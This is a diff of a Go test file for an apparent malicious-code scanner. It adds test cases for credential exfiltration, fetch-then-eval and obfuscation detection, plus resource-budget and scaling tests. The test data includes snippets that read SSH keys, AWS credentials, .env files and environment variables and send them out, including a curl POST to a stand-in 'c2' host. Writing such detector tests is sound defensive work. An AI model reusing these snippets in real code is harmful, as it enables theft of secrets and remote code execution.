@@ -70,6 +70,33 @@ module.exports = { loadSharedConfigFiles, httpRequest };
 `
 )
 
+// requesterProbe copies the shape of an HTTP requester that drops the proxy
+// variables of the environment for one call and restores them afterwards.
+const requesterProbe = `import os
+import requests
+
+
+class Requester:
+    def __init__(self):
+        self._http_requester = requests.Session()
+
+    def get(self, url, **kwargs):
+        return self._call_method("get", url, **kwargs)
+
+    def _call_method(self, method, url, **kwargs):
+        popped = False
+        old_env = dict(os.environ)
+        for var_name in ("http_proxy", "https_proxy", "no_proxy"):
+            popped = True if os.environ.pop(var_name, None) else popped
+            popped = True if os.environ.pop(var_name.upper(), None) else popped
+        try:
+            return getattr(self._http_requester, method)(url, **kwargs)
+        finally:
+            if popped:
+                os.environ.clear()
+                os.environ.update(old_env)
+`
+
 const (
 	// A minified async function that reads a credential file and posts it.
 	ev1o = `var a=require('path'),b=require('os'),c=require('fs');(async()=>{var d=c.readFileSync(a.join(b.homedir(),'.aws','credentials'));await fetch('https://c2.test/k',{method:'POST',body:d})})();
@@ -276,6 +303,26 @@ func TestAnalyze(t *testing.T) {
 		{name: "secret read after a block comment on one line", path: "a.js", data: "/* config loader */ const env = require('fs').readFileSync('.env'); require('https').request(o).end(env);\n", want: []string{"EXFIL-001:1"}},
 
 		{name: "credential directory joined from the home directory", path: "a.js", data: "const dir = path.join(os.homedir(), '.ssh');\nconst names = fs.readdirSync(dir);\nfetch(url, { method: 'POST', body: names });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key joined from segments", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_ed25519'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key resolved from segments", path: "a.js", data: "const k = fs.readFileSync(path.resolve(os.homedir(), '.ssh', 'id_rsa'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key in a template literal", path: "a.js", data: "const k = fs.readFileSync(`${os.homedir()}/.ssh/id_ecdsa`);\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key with the pathlib operator", path: "a.py", data: "k = Path.home() / '.ssh' / 'id_rsa'\nrequests.post(url, data=k.read_text())\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key with a custom name", path: "a.js", data: "const k = fs.readFileSync(os.homedir() + '/.ssh/github_ed25519');\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh pem key", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'deploy.pem'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key in upper case", path: "a.js", data: "const k = fs.readFileSync(os.homedir() + '/.ssh/ID_ED25519');\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh private key name built from two strings", path: "a.js", data: "const k = fs.readFileSync(os.homedir() + '/.ssh/' + 'id' + '_ed25519');\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh key reached through a plain file name and a parent segment", path: "a.js", data: "const k = fs.readFileSync(os.homedir() + '/.ssh/known_hosts/../github_key');\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh key joined after a plain file name and a parent segment", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config', '..', 'github_key'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh directory glob", path: "a.py", data: "keys = glob.glob(os.path.expanduser('~/.ssh/*'))\nrequests.post(url, data=str(keys))\n", want: []string{"EXFIL-001:1"}},
+		{name: "ssh config joined from segments", path: "a.js", data: "const c = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config'), 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
+		{name: "ssh config resolved from segments", path: "a.js", data: "const c = fs.readFileSync(path.resolve(os.homedir(), '.ssh', 'config'), 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
+		{name: "ssh config concatenated", path: "a.js", data: "const c = fs.readFileSync(os.homedir() + '/.ssh/config', 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
+		{name: "ssh config in a template literal", path: "a.js", data: "const c = fs.readFileSync(`${os.homedir()}/.ssh/config`, 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
+		{name: "ssh config with the pathlib operator", path: "a.py", data: "c = Path.home() / '.ssh' / 'config'\nrequests.post(url, data=c.read_text())\n"},
+		{name: "ssh known_hosts joined from segments", path: "a.js", data: "const h = fs.readFileSync(path.join(os.homedir(), '.ssh', 'known_hosts'), 'utf8');\nfetch(url, { method: 'POST', body: h });\n"},
+		{name: "ssh authorized_keys joined from segments", path: "a.js", data: "const h = fs.readFileSync(path.join(os.homedir(), '.ssh', 'authorized_keys'), 'utf8');\nfetch(url, { method: 'POST', body: h });\n"},
+		{name: "ssh public key joined from segments", path: "a.js", data: "const p = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa.pub'), 'utf8');\nfetch(url, { method: 'POST', body: p });\n"},
+		{name: "ssh public key concatenated", path: "a.js", data: "const p = fs.readFileSync(os.homedir() + '/.ssh/id_ed25519.pub', 'utf8');\nfetch(url, { method: 'POST', body: p });\n"},
 		{name: "credential path resolved from segments", path: "a.js", data: "const f = fs.readFileSync(path.resolve(os.homedir(), '.aws', 'credentials'));\nfetch(url, { method: 'POST', body: f });\n", want: []string{"EXFIL-001:1"}},
 		{name: "npm token file joined from segments is not counted", path: "a.js", data: "const rc = fs.readFileSync(path.join(os.homedir(), `.npmrc`), 'utf8');\nfetch(url, { body: rc });\n"},
 		{name: "python credential path joined from segments", path: "a.py", data: "p = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:1"}},
@@ -316,8 +363,28 @@ func TestAnalyze(t *testing.T) {
 		{name: "response text handed to eval with optional chaining", path: "a.js", data: "fetch(url)?.then?.(eval);\n", want: []string{"EXEC-001:1"}},
 		{name: "response text evaluated in an arrow callback", path: "a.js", data: "fetch(url).then((r) => r.text()).then((t) => eval(t));\n", want: []string{"EXEC-001:1"}},
 		{name: "response text evaluated in a function callback", path: "a.js", data: "fetch(url)\n  .then(function (r) { return r.text(); })\n  .then(function (t) { eval(t); });\n", want: []string{"EXEC-001:3"}},
+		{name: "response text evaluated in a named function callback", path: "a.js", data: "fetch(u).then(function toText(r) { return r.text(); }).then(function runCode(code) { eval(code); });\n", want: []string{"EXEC-001:1"}},
+		{name: "response data evaluated in a named function callback", path: "a.js", data: "axios.get(u).then(function handle(resp) { eval(resp.data); });\n", want: []string{"EXEC-001:1"}},
 		{name: "eval of a loop variable next to a fetch", path: "run.js", data: testRunnerProbe},
+		{name: "eval of a name assigned from an await", path: "a.js", data: "const r = await fetch(url);\nconst code = await r.text();\neval(code);\n", want: []string{"EXEC-001:3"}},
+		{name: "eval of each part of a response in a for loop", path: "a.js", data: "for (const line of (await (await fetch(url)).text()).split(';;')) eval(line);\n", want: []string{"EXEC-001:1"}},
+		{name: "eval of a name copied from a name that gets the response", path: "a.js", data: "const r = await fetch(url);\nconst t = await r.text();\nconst code = t;\neval(code);\n", want: []string{"EXEC-001:4"}},
+		{name: "eval of a name set from a method of the response text", path: "a.js", data: "fetch(url)\n  .then((r) => r.text())\n  .then((t) => { const code = t.trim(); eval(code); });\n", want: []string{"EXEC-001:3"}},
+		{name: "eval of a name set from the response text with a prefix", path: "a.js", data: "const r = await fetch(url);\nconst t = await r.text();\nconst code = '\"use strict\";' + t;\neval(code);\n", want: []string{"EXEC-001:4"}},
+		{name: "eval of a name set from a call on the response text", path: "a.js", data: "fetch(url)\n  .then((r) => r.text())\n  .then((t) => { const code = decodeURIComponent(t); eval(code); });\n", want: []string{"EXEC-001:3"}},
+		{name: "eval of a name set from a template of the response text", path: "a.js", data: "const t = await (await fetch(url)).text();\nconst code = `${t}`;\neval(code);\n", want: []string{"EXEC-001:3"}},
+		{name: "eval of a property set from the response text", path: "a.js", data: "st.code = await (await fetch(url)).text();\neval(st.code);\n", want: []string{"EXEC-001:2"}},
+		{name: "eval of a template that uses the parameter of a declared function next to a fetch", path: "a.js", data: "await ns.fetch(u);function load(params){const code=`(${params.x})`;return eval(code)}\n"},
+		{name: "eval of the parameter of a declared function after a fetch", path: "a.js", data: "await ns.fetch(u);function patchInstanceOf(item,ctx){ctx.x=eval(item);return ctx}\n"},
+		{name: "eval of a name set from a string literal next to a fetch", path: "a.js", data: "await fetch(url);\nconst code = 'use strict';\neval(code);\n"},
+		{name: "eval of a name copied three assignments away from the response", path: "a.js", data: "const a = await (await fetch(url)).text();\nconst b = a;\nconst c = b;\nconst d = c;\neval(d);\n"},
+		{name: "eval of a name set by a callback through a function", path: "a.js", data: "fetch(url)\n  .then((r) => r.text())\n  .then((t) => { code = t; run(); });\nfunction run() { eval(code); }\n", want: []string{"EXEC-001:4"}},
+		{name: "eval of an array that the response is pushed to", path: "a.js", data: "parts.push(await (await fetch(url)).text());\neval(parts.join(''));\n", want: []string{"EXEC-001:2"}},
+		{name: "eval of an array that something else is pushed to", path: "a.js", data: "await fetch(url);\nparts.push(process.argv[2]);\neval(parts.join(''));\n"},
+		{name: "eval of a template literal next to an unrelated fetch", path: "a.js", data: "async function load(u) { return await ns.fetch(u); }\nconst getModuleCode = `return 1;`;\nconst m = eval(getModuleCode)(a);\n"},
 		{name: "eval of a name that the fetch does not produce", path: "a.js", data: "const r = await fetch(url);\neval(other);\n"},
+		{name: "eval of a name assigned from the command line next to a fetch", path: "a.js", data: "await fetch(health);\nconst expr = process.argv[2];\neval(expr);\n"},
+		{name: "eval of a name assigned from a local call next to a fetch", path: "a.js", data: "const r = await fetch(url);\nconst code = build();\neval(code);\n"},
 		{name: "stream body evaluated at the end of the response", path: "a.js", data: "http.get(url, (res) => {\n  let body = '';\n  res.on('data', (c) => { body += c; });\n  res.on('end', () => eval(body));\n});\n", want: []string{"EXEC-001:4"}},
 		{name: "new Function of a response text", path: "a.js", data: "const r = await fetch(url);\nconst f = new Function(await r.text());\nf();\n", want: []string{"EXEC-001:2"}},
 		{name: "Function of axios data", path: "a.js", data: "const { data } = await axios.get(url);\nFunction(data)();\n", want: []string{"EXEC-001:2"}},
@@ -358,6 +425,30 @@ func TestAnalyze(t *testing.T) {
 		{name: "environment copy extended for a child", path: "a.js", data: "const e = Object.assign({}, process.env, { A: 1 });\nrun(cmd, { env: e });\nfetch(url, { body: other });\n"},
 		{name: "environment copy with a request 80 lines later", path: "a.py", data: "env = os.environ.copy()\n" + strings.Repeat("work()\n", 80) + "urllib.request.urlopen(url)\n"},
 		{name: "environment copy far from a request that uses it", path: "a.js", data: "const e = { ...process.env };\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: JSON.stringify(e) });\n"},
+		{name: "environment copy as the body of a request", path: "a.js", data: "const res = await fetch(url, { method: 'POST', body: JSON.stringify(process.env) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment copy as an argument of a request that is assigned", path: "a.js", data: "const res = await axios.post(url, JSON.stringify(process.env));\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy as the data of a request that is assigned", path: "a.py", data: "r = requests.post(url, data=dict(os.environ))\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy sent by a later statement", path: "a.py", data: "d = dict(os.environ)\nreq = urllib.request.Request(url)\nurllib.request.urlopen(req, json.dumps(d).encode())\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment copy as an argument of a curl process", path: "a.js", data: "const { execFileSync } = require('child_process');\nexecFileSync('curl', ['-s', '-X', 'POST', '-d', JSON.stringify(process.env), 'https://c2.sinkhole.test/c']);\n", want: []string{"EXEC-002:2", "EXFIL-001:2"}},
+		{name: "python environment copy as an argument of a curl process", path: "a.py", data: "subprocess.run(['curl', '-s', '-d', json.dumps(dict(os.environ)), url])\n", want: []string{"EXEC-002:1", "EXFIL-001:1"}},
+		{name: "python environment copy encoded by a method before the request", path: "a.py", data: "payload = json.dumps(dict(os.environ))\nrequests.post(url, data=payload.encode())\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy encoded by a method inside the data", path: "a.py", data: "blob = json.dumps(dict(os.environ))\nrequests.post(url, data={'d': blob.encode('utf-8')})\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment copy converted by a method inside the body", path: "a.js", data: "const data = JSON.stringify(process.env);\nfetch(url, { method: 'POST', body: data.toString() });\n", want: []string{"EXFIL-001:1"}},
+		{name: "python one property of an environment copy", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, params={'p': env.name})\n"},
+		{name: "python environment copy in a variable named env is not the env option", path: "a.py", data: "env = dict(os.environ)\nrequests.post(url, data=env)\n", want: []string{"EXFIL-001:1"}},
+		{name: "minified names that collide with a call of the environment copy", path: "a.js", data: "t=...process.env,r=t(e=r,fetch(e"},
+		{name: "environment spread returned by a function", path: "a.js", data: "var f = function () { return { ...process.env, A: 1 }; };\nfetch(f());\n"},
+		{name: "environment spread as the env option of a call that takes the object", path: "a.js", data: "const run = execvp('git', ['diff', '--no-index', a, b], { cwd: dir, env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1' } });\nfetch(run);\n"},
+		{name: "environment spread in an object with the stdio option", path: "a.js", data: "const s = { stdio: 'inherit', env: { ...process.env, YARN_IGNORE_PATH: '1' } };\nfetch(s);\n"},
+		{name: "environment spread in a report object", path: "a.js", data: "const report = { host: os.hostname(), env: { ...process.env }, cwd: process.cwd() };\nfetch(url, { method: 'POST', body: JSON.stringify(report) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment assigned into a report object", path: "a.js", data: "const report = { env: Object.assign({}, process.env) };\nfetch(url, { method: 'POST', body: JSON.stringify(report) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment as the env keyword of dict", path: "a.py", data: "report = dict(env={**os.environ})\nrequests.post(url, data=json.dumps(report))\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy to restore after a request", path: "requester.py", data: requesterProbe},
+		{name: "python environment copy restored right after a request", path: "a.py", data: "old_env = dict(os.environ)\nr = requests.get(url)\nos.environ.clear()\nos.environ.update(old_env)\n"},
+		{name: "python environment copy as the environment of a child and a request", path: "a.py", data: "env = dict(os.environ)\nsubprocess.run(cmd, env=env)\nrequests.get(url)\n", want: []string{"EXEC-002:2"}},
+		{name: "python environment copy for a child, passed inline, and a request", path: "a.py", data: "subprocess.run(cmd, env=dict(os.environ))\nrequests.get(url)\n", want: []string{"EXEC-002:1"}},
+		{name: "python proxy setting read from an environment copy", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies={'http': env.get('http_proxy')})\n"},
+		{name: "environment copy given as the proxies of a request", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies=env)\n"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -377,6 +468,26 @@ func rulesAt(rule string, line, n int) []string {
 		out = append(out, fmt.Sprintf("%s:%d", rule, line+i))
 	}
 	return out
+}
+
+// textBlobs returns n lines, each a string that holds base64 of about size
+// bytes of text. Every blob differs, and each decodes to printable text.
+func textBlobs(n, size int) string {
+	var b strings.Builder
+	for i := range n {
+		text := strings.Repeat(fmt.Sprintf("// filler text %d of a blob\n", i), size/24+1)
+		fmt.Fprintf(&b, "var k%d = '%s';\n", i, b64(text))
+	}
+	return b.String()
+}
+
+// envCopies returns n lines that each copy the environment to a new variable.
+func envCopies(n int) string {
+	var b strings.Builder
+	for i := range n {
+		fmt.Fprintf(&b, "var e%d=process.env;\n", i)
+	}
+	return b.String()
 }
 
 // manyAliases binds one name more than the alias cap and uses the last one.
@@ -689,15 +800,24 @@ func TestAnalyzeLimits(t *testing.T) {
 		{name: "1 MB run of spaces only", path: "pad.js", data: pad(1 << 20)},
 		{name: "payload at the end of a 2 MB line", path: "big.js", data: strings.Repeat(minifiedUnit, 2<<20/len(minifiedUnit)) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
 		{name: "payload across a window cut", path: "cut.js", data: strings.Repeat(";", 256<<10-4) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
-		{name: "1 MB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 1<<20/5), wantSkip: protocol.SkipTooLarge},
+		{name: "400 KB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 400<<10/5), wantSkip: protocol.SkipBudget},
 		{name: "2 MB blob on one line", path: "blob.js", data: "var x='" + unit(2<<20) + "';\n", wantRules: []string{"OBF-003:1"}},
 		{name: "many copies of an alias", path: "copies.js", data: strings.Repeat("b=h;", 1<<17) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n", wantRules: []string{"EXFIL-001:3"}},
 		{name: "900 credential path segments on separate lines", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 900) + "fetch(u);\n", wantRules: rulesAt("EXFIL-001", 801, protocol.MaxFindingsPerRulePerFile)},
-		{name: "1200 credential path segments are more than are checked", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 1200) + "fetch(u);\n", wantSkip: protocol.SkipTooLarge},
-		{name: "40 environment copies, each followed by 1000 assignments", path: "carriers.js", data: strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 1000)+"\n", 40) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n", wantRules: []string{"EXFIL-001:81"}, wantSkip: protocol.SkipTooLarge},
-		{name: "5000 bare dynamic imports before a request", path: "imports.py", data: strings.Repeat("__import__('requests')\n", 5000) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n", wantRules: []string{"EXFIL-001:5001"}, wantSkip: protocol.SkipTooLarge},
+		{name: "1200 credential path segments are more than are checked", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 1200) + "fetch(u);\n", wantSkip: protocol.SkipBudget},
+		{name: "40 environment copies, each followed by 1000 assignments", path: "carriers.js", data: strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 1000)+"\n", 40) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n", wantRules: []string{"EXFIL-001:81"}, wantSkip: protocol.SkipBudget},
+		{name: "5000 bare dynamic imports before a request", path: "imports.py", data: strings.Repeat("__import__('requests')\n", 5000) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n", wantRules: []string{"EXFIL-001:5001"}, wantSkip: protocol.SkipBudget},
 		{name: "4100 dynamic imports of other modules before a request module", path: "imports.py", data: strings.Repeat("m = __import__('os')\n", 4100) + "import requests as r\nr.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:4102"}},
 		{name: "5000 plain imports of other modules before a request module", path: "imports.py", data: strings.Repeat("import os\n", 5000) + "import requests\ns = requests\ns.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:5003"}},
+		{name: "17 blobs that decode to text are more than are decoded, and that is not a budget skip", path: "blobs.js", data: textBlobs(17, 400), wantRules: rulesAt("OBF-003", 1, 17)},
+		{name: "1M empty calls are more hits than are kept", path: "hits.js", data: strings.Repeat("eval()", 1<<20+1), wantSkip: protocol.SkipBudget},
+		{name: "1100 secret references in one window are more than signals returns", path: "refs.js", data: strings.Repeat("$A_KEY;\n", 1100) + ".ssh/id_rsa\n", wantSkip: protocol.SkipBudget},
+		{name: "1100 network tools in one window are more than signals returns", path: "tools.js", data: strings.Repeat("curl x;\n", 1100), wantSkip: protocol.SkipBudget},
+		{name: "24 blocks of dense credential paths are more than the signals budget", path: "windows.js", data: strings.Repeat(strings.Repeat("join(a,'.ssh');\n", 999)+strings.Repeat("y", 1100)+"\n", 24), wantSkip: protocol.SkipBudget},
+		{name: "9000 callbacks that hand a response to eval exhaust the call argument budget", path: "then.js", data: strings.Repeat("p.then(eval);\n", 9000), wantSkip: protocol.SkipBudget},
+		{name: "80 calls with a name that is never assigned exhaust the lookback", path: "lookback.js", data: strings.Repeat("y;\n", 25000) + strings.Repeat("eval(zq);\n", 80), wantSkip: protocol.SkipBudget},
+		{name: "1100 credential paths assigned to a variable, far from the request, use up the carrier search", path: "far.js", data: strings.Repeat("credpath = join(a, '.aws', 'credentials');\n"+strings.Repeat("// pad\n", 40), 1100) + "fetch(u);\n", wantRules: []string{"EXFIL-001:45019", "EXFIL-001:45060"}, wantSkip: protocol.SkipBudget},
+		{name: "3000 environment copies exhaust the carrier search", path: "copies.js", data: envCopies(3000) + "fetch(u);\n", wantSkip: protocol.SkipBudget},
 		{name: "many assignments to look back through", path: "assign.py", data: strings.Repeat("a=", 2<<20) + "\nexec(a)\n"},
 	}
 	for _, tt := range tests {
@@ -707,8 +827,8 @@ func TestAnalyzeLimits(t *testing.T) {
 
 			got, out := analyzeFileCtx(t, ctx, tt.path, tt.data)
 
-			if !slices.Equal(got, tt.wantRules) {
-				t.Errorf("findings = %v, want %v", got, tt.wantRules)
+			if want := slices.Sorted(slices.Values(tt.wantRules)); !slices.Equal(got, want) {
+				t.Errorf("findings = %v, want %v", got, want)
 			}
 			var skip string
 			if len(out.Skips) > 0 {
@@ -730,14 +850,15 @@ func TestAnalyzeScalesLinearly(t *testing.T) {
 	tests := []struct {
 		name string
 		// inputs
-		path  string
-		build func(n int) string
-		small int
-		large int
+		path    string
+		build   func(n int) string
+		small   int
+		large   int
+		control func(n int) string // when set, the small input is control(large): the same size without the flood
 		// expectations
 		wantMaxRatio float64
 	}{
-		{name: "16x more unclosed calls", path: "eval.js", build: func(n int) string { return strings.Repeat("eval(", n/5) }, small: 16 << 10, large: 256 << 10, wantMaxRatio: 60},
+		{name: "16x more unclosed calls", path: "eval.js", build: func(n int) string { return strings.Repeat("eval(", n/5) }, small: 4 << 10, large: 64 << 10, wantMaxRatio: 60},
 		{name: "16x longer run of spaces", path: "pad.js", build: func(n int) string { return "a();" + pad(n) + "b();\n" }, small: 256 << 10, large: 4 << 20, wantMaxRatio: 100},
 		{name: "16x longer minified line", path: "big.min.js", build: func(n int) string { return strings.Repeat(minifiedUnit, n/len(minifiedUnit)) + "\n" }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
 		{name: "16x more blobs", path: "blobs.js", build: func(n int) string { return strings.Repeat("var k = '"+unit(256)+"';\n", n/270) }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
@@ -747,13 +868,30 @@ func TestAnalyzeScalesLinearly(t *testing.T) {
 		{name: "16x more dynamic imports", path: "imports.py", build: func(n int) string {
 			return strings.Repeat("__import__('requests')\n", n/23) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
 		}, small: 4 << 10, large: 64 << 10, wantMaxRatio: 100},
+		{
+			name: "a flood of imports of other modules costs about the same as other calls", path: "imports.py",
+			build: func(n int) string {
+				return strings.Repeat("__import__('a')\n", n/16) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
+			},
+			control: func(n int) string {
+				return strings.Repeat("__imput__('a')\n", n/16) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
+			},
+			large: 4 << 20, wantMaxRatio: 3,
+		},
+		{name: "16x more evals of names that are assigned many times next to fetches", path: "binds.js", build: func(n int) string {
+			block := "await fetch(u); " + strings.Repeat("x = y, ", 500) + "\neval(x);\n"
+			return strings.Repeat(block, n/len(block)) + "fetch(u).then((t) => eval(t));\n"
+		}, small: 4 << 10, large: 64 << 10, wantMaxRatio: 100},
 		{name: "16x more copies of an alias", path: "copies.js", build: func(n int) string {
 			return strings.Repeat("b=h;", n/4) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n"
-		}, small: 64 << 10, large: 1 << 20, wantMaxRatio: 100},
+		}, small: 32 << 10, large: 512 << 10, wantMaxRatio: 100},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			small := analyze.File{Path: tt.path, Name: tt.path, Data: []byte(tt.build(tt.small))}
+			if tt.control != nil {
+				small.Data = []byte(tt.control(tt.large))
+			}
 			large := analyze.File{Path: tt.path, Name: tt.path, Data: []byte(tt.build(tt.large))}
 
 			ratio := float64(fastest(t, large)) / float64(fastest(t, small))
